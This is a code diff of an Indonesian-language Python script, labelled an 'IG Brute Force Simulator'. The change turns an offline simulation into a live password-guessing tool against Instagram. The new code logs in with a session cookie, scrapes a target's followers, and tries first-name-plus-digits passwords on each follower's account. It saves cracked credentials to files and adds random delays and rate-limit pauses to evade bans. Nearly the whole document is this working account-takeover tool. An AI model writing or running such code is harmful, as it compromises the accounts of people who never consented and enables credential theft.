@@ -1,93 +1,98 @@
+import os
+import json
+import time
+import random
 from instagrapi import Client
+from instagrapi.exceptions import LoginRequired, ChallengeRequired, PleaseWaitFewMinutes, FeedbackRequired
+from utils.scraper import scrape_followers
+from utils.brute_force import try_login
 from colorama import Fore, init
-import time, os
-from utils.banner import tampilkan_banner
-from utils.license_check import is_license_valid
 
-init(autoreset=True)  # colorama otomatis reset warna
+init(autoreset=True)
 
-# Akun simulasi login lokal
-akun_valid = {
-    "akun1": "akun1123",
-    "akun2": "akun2@123",
-    "giyanjp": "giyanjp2025"
-}
+DATA_FOLDER = "Data/akun1"
+COOKIE_FILE = os.path.join(DATA_FOLDER, "cookie.txt")
+USER_FILE = os.path.join(DATA_FOLDER, "user.txt")
+HASH_DB = "hash_db.json"
 
-def cek_login(username, password):
-    return akun_valid.get(username) == password
-
-def generate(username):
-    return list({
-        username,
-        username + "123",
-        "123" + username,
-        username + "@123",
-        username + "2025",
-        username.capitalize(),
-        username.upper()
-    })
-
-def simpan_hasil(cl, username, password):
-    try:
-        user_info = cl.user_info_by_username(username)
-        post = user_info.media_count
-        followers = user_info.follower_count
-        following = user_info.following_count
-
-        with open("hasil_sukses.txt", "a") as f:
-            f.write(f"{username} | {password} | Postingan: {post} | Followers: {followers} | Following: {following}\n")
-        
-        print(Fore.GREEN + f"✅ {username} | {password} | Postingan: {post} | Followers: {followers} | Following: {following}")
-    except Exception as e:
-        print(Fore.RED + f"❌ Gagal ambil info akun: {e}")
-
-def clear_terminal():
-    os.system("clear" if os.name == "posix" else "cls")
-
-def cek_lisensi():
-    print(Fore.YELLOW + "🔑 CEK LISENSI")
-    lisensi = input("Masukkan kode lisensi: ")
-    if not is_license_valid(lisensi):
-        print(Fore.RED + "❌ Lisensi tidak valid.")
+def load_cookie():
+    if not os.path.exists(COOKIE_FILE) or not os.path.exists(USER_FILE):
+        print(Fore.RED + "[!] cookie.txt atau user.txt tidak ditemukan.")
         exit()
-    print(Fore.GREEN + "✅ Lisensi valid.\n")
+
+    with open(USER_FILE, "r") as f:
+        username = f.read().strip()
+
+    with open(COOKIE_FILE, "r") as f:
+        cookie_raw = f.read().strip()
+
+    cookies = {}
+    for part in cookie_raw.split(";"):
+        if "=" in part:
+            k, v = part.strip().split("=", 1)
+            cookies[k] = v
+    return username, cookies
+
+def save_result(username, password):
+    with open("hasil_sukses.txt", "a") as f:
+        f.write(f"{username} | {password}\n")
+
+def load_hash_db():
+    if not os.path.exists(HASH_DB):
+        return {}
+    with open(HASH_DB, "r") as f:
+        return json.load(f)
+
+def update_hash_db(db):
+    with open(HASH_DB, "w") as f:
+        json.dump(db, f, indent=2)
 
 def main():
-    clear_terminal()
-    tampilkan_banner()
-    cek_lisensi()
+    os.system("clear")
+    print(Fore.CYAN + "== Gold3xp IG Brute Force Simulator ==")
+    target_user = input(Fore.YELLOW + "Masukkan username target (tanpa @): ").strip().lstrip("@")
+
+    login_user, cookies = load_cookie()
 
     cl = Client()
-    ui = input("👤 IG Username: ")
-    pi = input("🔐 IG Password: ")
     try:
-        cl.login(ui, pi)
+        cl.login_by_sessionid(cookies.get("sessionid"))
+        print(Fore.GREEN + f"[✓] Login berhasil sebagai @{login_user}")
     except Exception as e:
-        print(Fore.RED + f"❌ Gagal login: {e}")
+        print(Fore.RED + f"[✗] Gagal login: {e}")
         return
 
-    try:
-        user_id = cl.user_id_from_username(ui)
-        followers = cl.user_followers(user_id, amount=0)
-        users = [info.username for info in followers.values()]
-    except Exception as e:
-        print(Fore.RED + f"❌ Gagal ambil followers: {e}")
-        return
+    print(Fore.CYAN + f"⏳ Mengambil followers dari @{target_user}...")
+    followers = scrape_followers(cl, target_user)  # ✅ Perbaikan di sini
+    print(Fore.GREEN + f"[✓] Ditemukan {len(followers)} followers")
 
-    wordlist = list({pw for u in users for pw in generate(u)})
+    hash_db = load_hash_db()
 
-    # Jalankan brute force simulasi
-    for u in users:
-        berhasil = False
-        for pw in wordlist:
-            if pw.startswith(u):  # hanya kombinasi logis
-                if cek_login(u, pw):
-                    simpan_hasil(cl, u, pw)
-                    berhasil = True
-                    break
-                time.sleep(0.2)
-        if not berhasil:
-            pass  # tidak tampilkan yang gagal
+    for username, full_name in followers.items():
+        name_parts = full_name.split(" ")
+        base = name_parts[0] if name_parts and name_parts[0] else username
+        passwords = [base + str(i) for i in [123, 1234, 12345, 321, ""]]
+
+        for password in passwords:
+            print(Fore.YELLOW + f"⏳ Menguji: {username} | {password}")
+            status = try_login(username, password)
+
+            if status == "success":
+                print(Fore.GREEN + f"✅ Valid: {username} | {password}")
+                save_result(username, password)
+                hash_db[username] = password
+                update_hash_db(hash_db)
+                break
+            elif status == "challenge":
+                print(Fore.RED + f"🔒 Checkpoint: {username}")
+                break
+            elif status == "feedback":
+                print(Fore.MAGENTA + f"🔁 Rate limit. Jeda 60 detik...")
+                time.sleep(60)
+                break
+            else:
+                print(Fore.RED + f"❌ Invalid")
+                time.sleep(random.uniform(1.5, 2.5))  # Delay aman biar tidak cepat banned
 
 if __name__ == "__main__":
     main()
